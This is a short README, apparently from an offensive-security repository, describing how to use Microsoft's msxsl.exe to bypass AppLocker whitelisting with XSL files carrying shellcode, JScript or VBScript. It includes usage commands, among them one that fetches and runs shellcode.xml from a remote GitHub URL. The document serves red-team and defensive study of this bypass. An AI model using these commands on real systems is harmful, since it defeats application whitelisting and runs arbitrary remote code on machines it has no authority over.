# Use-msxsl-to-bypass-AppLocker

Learn from Casey Smith@subTee

https://twitter.com/subTee/status/877616321747271680

### Usage:

	msxsl.exe argv1.xml shellcode.xml/JScript.xml/VBScript.xml
	
	or
	
	msxsl.exe shellcode.xml/JScript.xml/VBScript.xml shellcode.xml/JScript.xml/VBScript.xml
	
	or remote execution(Evi1cg told me)，like this:
	
	msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml

### shellcode.xml:

Use msxsl to run shellcode.

Combine Casey Smith's msxsl POC and Cn33liz's StarFighters.

Link:

	https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1   
	https://github.com/Cn33liz/StarFighters/blob/master/StarFighter.js

### JScript.xml:

Use JScript to run calc.exe

From: https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1#file-script-xsl

### VBScript.xml:

Use VBScript to run calc.exe

Details：

https://3gstudent.github.io/Use-msxsl-to-bypass-AppLocker
